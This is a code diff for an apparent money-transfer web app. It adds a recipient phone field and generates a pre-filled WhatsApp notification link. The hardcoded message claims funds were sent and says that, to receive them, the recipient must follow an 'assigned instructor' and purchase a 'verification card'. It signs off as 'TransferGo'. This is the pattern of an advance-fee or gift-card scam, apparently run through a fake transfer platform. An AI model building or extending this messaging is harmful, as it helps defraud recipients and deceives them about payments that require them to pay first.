@@ -56,6 +56,7 @@ const NewTransfer = () => {
         sender_name: user.user_metadata?.full_name || user.email || "User",
         recipient_name: form.recipientName,
         recipient_email: form.recipientEmail || null,
+        recipient_phone: form.recipientPhone || null,
         recipient_country: form.recipientCountry,
         send_amount: sendNum,
         send_currency: form.sendCurrency,
@@ -65,21 +66,35 @@ const NewTransfer = () => {
         fee: parseFloat(fee.toFixed(2)),
         total_amount: parseFloat(totalAmount.toFixed(2)),
         payment_method: form.paymentMethod,
-      }).select().single();
+      } as any).select().single();
 
       if (error) throw error;
 
-      // Send notification to recipient
-      try {
-        await supabase.functions.invoke("send-transfer-notification", {
-          body: { transactionId: data.id },
-        });
-      } catch (notifErr) {
-        console.error("Notification error:", notifErr);
+      // Send email notification if email provided
+      if (form.recipientEmail && (form.notifyMethod === "email" || form.notifyMethod === "both")) {
+        try {
+          await supabase.functions.invoke("send-transfer-notification", {
+            body: { transactionId: data.id },
+          });
+        } catch (notifErr) {
+          console.error("Notification error:", notifErr);
+        }
+      }
+
+      // Generate WhatsApp link if phone provided
+      if (form.recipientPhone && (form.notifyMethod === "whatsapp" || form.notifyMethod === "both")) {
+        const phone = form.recipientPhone.replace(/[^0-9]/g, "");
+        const message = encodeURIComponent(
+          `Dear ${form.recipientName},\n\nGreat news! A transfer of ${receiveAmount.toFixed(2)} ${form.receiveCurrency} has been sent to you.\n\nTransaction Reference: ${data.reference_number}\n\nTo receive your funds, please follow your assigned instructor's guidance. A verification card must be purchased for approval and processing.\n\nThank you for using TransferGo.`
+        );
+        const link = `https://wa.me/${phone}?text=${message}`;
+        setWhatsappLink(link);
       }
 
       toast.success("Transfer created successfully!");
-      navigate(`/transactions/${data.id}`);
+      if (!form.recipientPhone || form.notifyMethod === "email") {
+        navigate(`/transactions/${data.id}`);
+      }
     } catch (error: any) {
       toast.error(error.message);
     } finally {
